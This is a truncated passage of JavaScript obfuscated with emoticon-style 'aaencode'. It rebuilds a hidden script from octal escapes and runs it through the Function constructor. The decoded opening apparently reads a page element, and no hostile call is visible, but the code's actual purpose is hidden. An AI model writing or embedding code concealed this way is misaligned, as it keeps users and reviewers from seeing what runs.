    (ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];
    (ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ 